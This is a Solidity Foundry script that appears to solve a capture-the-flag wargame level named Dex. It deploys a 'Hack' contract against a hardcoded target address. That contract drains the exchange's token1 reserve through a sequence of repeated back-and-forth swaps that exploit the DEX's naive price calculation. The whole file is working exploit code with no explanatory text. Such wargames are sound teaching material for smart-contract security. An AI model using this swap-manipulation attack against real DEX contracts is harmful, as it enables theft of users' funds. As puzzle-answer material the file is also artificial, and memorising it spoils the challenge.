// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Dex} from "../src/Dex.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexSolution is Script {
    address target = 0xd89fd4A072ceba53FB833e57e33Fd30020cFb79D;

    function run() external {
        vm.startBroadcast();
        Hack hack = new Hack(target);
        approve(address(hack), type(uint256).max);
        hack.attack(vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }

    function approve(address spender, uint256 amount) public {
        IERC20 token1 = IERC20(Dex(target).token1());
        IERC20 token2 = IERC20(Dex(target).token2());
        token1.approve(spender, amount);
        token2.approve(spender, amount);
    }
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Hack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(address _target) {
        dex = IDex(_target);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function attack(address from) public {
        token1.transferFrom(from, address(this), 10);
        token2.transferFrom(from, address(this), 10);

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);

        console.log("Balance of token1: %s", dex.balanceOf(address(token1), address(this)));
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}
